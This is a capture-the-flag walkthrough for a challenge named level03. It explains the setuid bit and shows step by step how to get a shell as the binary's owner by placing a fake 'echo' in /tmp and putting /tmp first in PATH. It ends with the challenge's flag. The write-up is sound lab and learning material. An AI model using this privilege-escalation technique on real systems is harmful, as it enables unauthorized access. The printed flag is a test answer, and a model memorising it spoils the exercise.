`ls -l` <br/>
-rwsr-sr-x  1  flag03  level03  8627  Mar  5  2016  level03

`whoami` <br/>
level03

`groups` <br/>
level03 users

`The s in rws stands for setuid meaning set user ID. When applied to an executable file, it sets the effective user ID from that of the real user (the user actually running the program) to that of the program's owner. Most often this is given to a few programs owned by the superuser. When an ordinary user runs a program that is "setuid root" , the program runs with the effective privileges of the superuser. This allows the program to access files and directories that an ordinary user would normally be prohibited from accessing. Clearly, because this raises security concerns, the number of setuid programs must be held to an absolute minimum.` <br/>
https://askubuntu.com/questions/857066/meaning-of-the-access-permissions-rws-and-root-root-of-usr-bin-sudo

So my user ID will go from level03 to flag03 (program's owner) during the execution of level03.

How can I make this program runs getflag ?

`./level03` <br/>
Exploit me

`strings level03` <br/>
...<br/>
/usr/bin/env echo Exploit me<br/>
...<br/>

https://stackoverflow.com/questions/8304396/what-is-vulnerable-about-this-c-code <br/>
We can see the program calls the echo function. The ENV utility will invoke the first sh or bash executable found in the user's $PATH.<br/>
https://stackoverflow.com/questions/43793040/how-does-usr-bin-env-work-in-a-linux-shebang-line

`The PATH environment variable is a colon-delimited list of directories that your shell searches through when you enter a command.`

If we make our fake echo function then change the path so that it finds our echo first instead of the real one, tt will run it as flag03.

`echo "/bin/bash" > /tmp/echo` <br/>
Create a fake echo that will execute /bin/bash, that is a new connection to our shell with the current user's permission

`chmod 777 /tmp/echo` <br/>
otherwise the file is `-rw-rw-r-- 1 level03 level03 10 Sep 22 02:19 /tmp/echo` and flag03 can't execute it


`export PATH=/tmp:$PATH` <br/>
We added tmp directory at the start of the path. Do command `env` and see path went from: <br/>
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games<br/>
to <br/>
PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games


`./level03`

You are now flag3 because you "opened" a new shell with the rights of flag03

`getflag` gives `qi0maab88jeaj46qoumi7maus`

https://www.cgsecurity.org/Articles/SecProg/Art1/index-fr.html

